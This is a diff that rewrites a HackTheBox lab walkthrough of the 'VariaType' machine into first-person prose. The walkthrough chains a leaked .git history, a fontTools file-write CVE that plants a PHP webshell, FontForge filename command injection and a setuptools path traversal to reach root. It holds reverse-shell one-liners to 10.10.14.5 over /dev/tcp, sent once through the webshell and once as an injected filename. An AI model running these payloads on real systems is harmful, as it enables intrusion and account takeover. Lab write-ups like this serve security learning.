@@ -9,49 +9,29 @@ avatar: assets/htb/variatype.png
 tags: [Arbitrary File Read, Remote Code Execution, OS Command Injection, Arbitrary File Write, Directory Traversal, Hard-coded Credentials, Insecure Design, Reconnaissance]
 htb_url: https://app.hackthebox.com/machines/VariaType
 ---
+
 ## Summary
 
-VariaType is a font-processing web stack with two virtual hosts (public + internal). Initial foothold chains an exposed `.git` directory whose history contains hardcoded credentials, then weaponises **CVE-2025-66034** (fontTools varLib arbitrary file write via XML/CDATA injection in `.designspace`) to drop a PHP webshell. Lateral movement abuses **CVE-2024-25082** (FontForge ZIP-filename command injection) for shell as a real user. Root comes from a sudo-runnable Python script that fetches plugins from a remote URL, parsed by a vulnerable setuptools version - **CVE-2025-47273** path traversal writes the attacker's authorized_keys to `/root/.ssh/`.
+VariaType is a Linux box built around a font-processing web stack split across two virtual hosts, one public and one internal. I get my foothold by chaining an exposed `.git` directory whose history leaks hardcoded credentials, then weaponising CVE-2025-66034 (fontTools varLib arbitrary file write via XML/CDATA injection in a `.designspace`) to drop a PHP webshell. I move laterally with CVE-2024-25082 (FontForge ZIP-filename command injection) to land a shell as a real user. Root falls to a sudo-runnable Python plugin loader that fetches plugins over a remote URL parsed by a vulnerable setuptools: CVE-2025-47273 path traversal writes my `authorized_keys` into `/root/.ssh/`.
 
----
+## Enumeration
 
-## External Writeups
-
-- [HavocSec - VariaType Complete Writeup](https://havocsec.me/pentesting/hackthebox/htb-variatype-complete-writeup)
-- [Medium - ItsSunshineXD](https://itssunshinexd.medium.com/htb-writeup-variatype-dc75e409ee8e)
-- [HTB-Andres (Beehiiv)](https://htb-writeup.beehiiv.com/p/variatype-machine-hackthebox)
-- [GitHub: Bimo754 - VariaType README](https://github.com/Bimo754/Writeups-Public/blob/main/Linux/Medium/VariaType/README.md)
-- [Ibrahim Isiaq Bolaji](https://www.ibrahimisiaqbolaji.com/2026/03/variatype-htb-write-up.html)
-- [CyberSecGuru](https://thecybersecguru.com/ctf-walkthroughs/mastering-variatype-beginners-guide-from-hackthebox/)
-- [1337 Sheets - VariaType Medium (Mar 15, 2026)](https://1337sheets.com/hack-the-box-season-10-htb-variatype-writeup-medium-weekly-march-15th-2026-2/)
-- [HackTheBox VariaType Walkthrough - YouTube](https://www.youtube.com/watch?v=-F_rb3xsFZk)
-
----
-
-## Key Techniques
-
-- Git directory exposure (`.git/HEAD`) and `git log -p` for deleted-commit secrets
-- **CVE-2025-66034** - fontTools varLib XML CDATA injection / arbitrary file write
-- Crafting malicious `.designspace` to write PHP into webroot
-- **CVE-2024-25082** - FontForge ZIP filename command injection
-- **CVE-2025-47273** - setuptools `PackageIndex` path traversal in wheel downloads
-- Privileged Python plugin loader writes attacker key to `/root/.ssh/authorized_keys`
-
----
-
-## Attack Path
-
-### 1. Recon
+I start with a full port scan and service detection, which only turns up SSH and HTTP.
 
 ```bash
 nmap -p- --min-rate=10000 -sV -sC variatype.htb
 # 22, 80
+```
+
+With web in scope, I fuzz for virtual hosts and find an internal development host alongside a Git host.
+
+```bash
 ffuf -u http://FUZZ.variatype.htb -H "Host: FUZZ.variatype.htb" \
      -w ~/wordlists/subdomains.txt -mc 200,403
 # git.variatype.htb / dev.variatype.htb (internal)
 ```
 
-### 2. Git Disclosure
+The `git.variatype.htb` vhost exposes a `.git` directory, so I mirror it and dig through history. A `git log -p` over all branches surfaces secrets that were committed and later reverted.
 
 ```bash
 wget -r http://git.variatype.htb/.git/
@@ -60,11 +40,11 @@ git log -p | grep -i 'password\|api_key\|token'
 # -password = "<creds>"  (in a reverted commit)
 ```
 
-Credentials grant access to the internal-only font submission portal.
+These credentials grant access to the internal-only font submission portal, which becomes my entry point.
 
-### 3. CVE-2025-66034 - fontTools File Write
+## Foothold
 
-Craft `.designspace` with XML CDATA injection that bypasses output-path validation:
+The font submission pipeline processes `.designspace` files with fontTools varLib, which is vulnerable to CVE-2025-66034: an XML CDATA injection that bypasses output-path validation and yields an arbitrary file write. I craft a `.designspace` whose source filename traverses into the webroot and whose CDATA payload is a PHP webshell.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -77,32 +57,34 @@ Craft `.designspace` with XML CDATA injection that bypasses output-path validati
 </designspace>
 ```
 
-Upload, pipeline writes `shell.php` under webroot. Trigger:
+After uploading, the pipeline writes `shell.php` under the webroot. I trigger it with a reverse shell.
 
 ```bash
 curl 'http://variatype.htb/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261%22'
 ```
 
-### 4. Lateral via FontForge Command Injection
+From the resulting shell I find a sudo rule allowing me to run a FontForge processing script as another user.
 
 ```bash
 sudo -u fontuser /usr/bin/fontforge -script /opt/fontforge/process.py "<user input>"
 ```
 
-`process.py` shells out to a ZIP utility with the user-provided filename. **CVE-2024-25082**: the filename is interpolated into a shell command:
+`process.py` shells out to a ZIP utility with the user-provided filename, and that filename is interpolated straight into a shell command - CVE-2024-25082. I inject a command-injection payload through the filename to get a shell as `fontuser`.
 
 ```bash
 filename="x;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1';.zip"
 ```
 
-### 5. Root via Sudo Python Plugin Loader
+## Privilege Escalation
+
+As `fontuser`, sudo lets me run a Python plugin loader as root.
 
 ```bash
 sudo -l
 # (root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
 ```
 
-`plugin_loader.py` calls `setuptools.package_index.PackageIndex.download(url, tmpdir)` which is vulnerable to **CVE-2025-47273** (path traversal in filename derivation). Host a wheel whose URL forces a write outside `tmpdir`:
+`plugin_loader.py` calls `setuptools.package_index.PackageIndex.download(url, tmpdir)`, which is vulnerable to CVE-2025-47273 - a path traversal in the way the destination filename is derived from the remote URL. I host a wheel whose URL forces the download to be written outside `tmpdir`, placing my public key directly into `/root/.ssh/authorized_keys`, then SSH in as root.
 
 ```bash
 python3 -m http.server 8000 &
@@ -110,12 +92,3 @@ python3 -m http.server 8000 &
 sudo /usr/bin/python3 /opt/plugin_loader.py http://10.10.14.5:8000/wheel
 ssh root@variatype.htb
 ```
-
----
-
-## Lessons Learned
-
-- `.git/` directory disclosure is timeless - greybox audits should still grep for it on every box.
-- XML CDATA injection in font/SVG/typography tooling is the new template-injection frontier (fontTools, FontForge).
-- `setuptools` historically trusts remote filenames - **CVE-2025-47273** turned `pip` and any setuptools-using script into path-traversal sinks.
-- Multi-CVE chains under a single sudo rule remain the highest-paid bug-hunting target in 2026.
